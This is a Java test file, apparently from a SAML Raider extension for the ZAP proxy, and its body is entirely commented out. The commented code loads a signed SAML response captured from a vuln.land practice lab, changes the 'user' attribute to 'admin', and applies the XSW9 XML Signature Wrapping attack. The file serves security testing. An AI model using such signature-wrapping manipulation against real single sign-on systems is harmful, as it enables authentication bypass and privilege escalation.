/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2015 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.example.samlraider.helpers;

public class xsw9Test {
    //    public static void main(String[] args) throws SAXException, IOException {
    //        String originalAssertion = "<samlp:Response
    // xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
    // xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
    // ID=\"_427c92140e2407df990cadb2212693f15a54f4aa7d\" Version=\"2.0\"
    // IssueInstant=\"2021-02-11T12:47:44Z\"
    // Destination=\"http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-sp.idocker.vuln.land/simplesaml/module.php/saml/sp/saml2-acs.php/default-sp\" InResponseTo=\"_a46cd6ba3876d54d902264d8ebe59af869772550b4\"><saml:Issuer>http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-idp.idocker.vuln.land</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"_83cfd12dce95ed77bb2560c8e00fb2a98931c631e3\" Version=\"2.0\" IssueInstant=\"2021-02-11T12:47:44Z\"><saml:Issuer>http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-idp.idocker.vuln.land</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
    //                "  <ds:SignedInfo><ds:CanonicalizationMethod
    // Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
    //                "    <ds:SignatureMethod
    // Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n" +
    //                "  <ds:Reference
    // URI=\"#_83cfd12dce95ed77bb2560c8e00fb2a98931c631e3\"><ds:Transforms><ds:Transform
    // Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform
    // Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod
    // Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>JY5IOzGUI5V6AKhabmyuuNGhrAI=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>i0WygaseCAnbUbYsMw5DCfIBOORVjdJDKio2j2YpJnUmJJIRPjko/GrbTZaxYB1vY705qF/uHyaZZ+iz8hdlJ+eIj5XOLACRqHdodNs1DR6fwZpF+2m3ehZWerDW+o0hy0+6dbSOP9RQpS0dpRhTgPXzJyVXt/VhMoL9Rj4hTO0=</ds:SignatureValue>\n" +
    //
    // "<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICDDCCAXWgAwIBAgIJAOE4zZWhw6OpMA0GCSqGSIb3DQEBCwUAMB8xCzAJBgNVBAYTAkNIMRAwDgYDVQQDDAdzYW1sdWVsMB4XDTE1MDUyNjIyNTMwMFoXDTI1MDUyNTIyNTMwMFowHzELMAkGA1UEBhMCQ0gxEDAOBgNVBAMMB3NhbWx1ZWwwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBALe4eeps2t6HwSsmtYnxlEhdBwIJ2c3+3hEONGVJckrmj6QlMCA9pkYnjk1Afm7JXscFiy2Bhlysanegnn9tjAqSmqe2PT6OhGXr+cmCJRGafby9+gFE0UccjtPW66TyjrcveB90/lJmyA86nc1iASFFwPeQMvJH+YyT9XXQ+ZhTAgMBAAGjUDBOMB0GA1UdDgQWBBRGqV8lPlWbcEikIcuB9vSzR9w6UzAfBgNVHSMEGDAWgBRGqV8lPlWbcEikIcuB9vSzR9w6UzAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBABLnTkSJMXlrRz9lDUJc0tBQ5O4cnnITPDuQ3L87+K932aJ7+pVpHSEtBlWxC0Bz3o6wNUsmcvA5lALeRbUec5UR9HL+9oTsX9+7+aMmuLE/edEwrhfJSzwW3wLAVx8LeLk9NlRJInrXy536Mj/fpOQDJA+C9+WgTlugN2OcxE76</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-sp.idocker.vuln.land\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">_c76a5f1d5a33654d73f4a679be9a106bd23f329a24</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2021-02-11T12:52:44Z\" Recipient=\"http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-sp.idocker.vuln.land/simplesaml/module.php/saml/sp/saml2-acs.php/default-sp\" InResponseTo=\"_a46cd6ba3876d54d902264d8ebe59af869772550b4\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2021-02-11T12:47:14Z\" NotOnOrAfter=\"2021-02-11T12:52:44Z\"><saml:AudienceRestriction><saml:Audience>http://9ac42dac-7dbd-45e8-b991-6411adcb12c2-sp.idocker.vuln.land</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2021-02-11T12:47:44Z\" SessionNotOnOrAfter=\"2021-02-11T20:47:44Z\" SessionIndex=\"_374f8809c36890bcfa35fce509ba646ee45628624d\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xsi:type=\"xs:string\">user</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonAffiliation\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xsi:type=\"xs:string\">member</saml:AttributeValue><saml:AttributeValue xsi:type=\"xs:string\">user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>";
    //        XSWHelpers.MATCH_AND_REPLACE_MAP.put("user", "admin");
    //
    //        XMLHelpers xmlHelpers = new XMLHelpers();
    //        XSWHelpers xswHelpers = new XSWHelpers();
    //
    //        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(originalAssertion);
    //        xswHelpers.applyXSW("XSW9", document);
    //    }
}
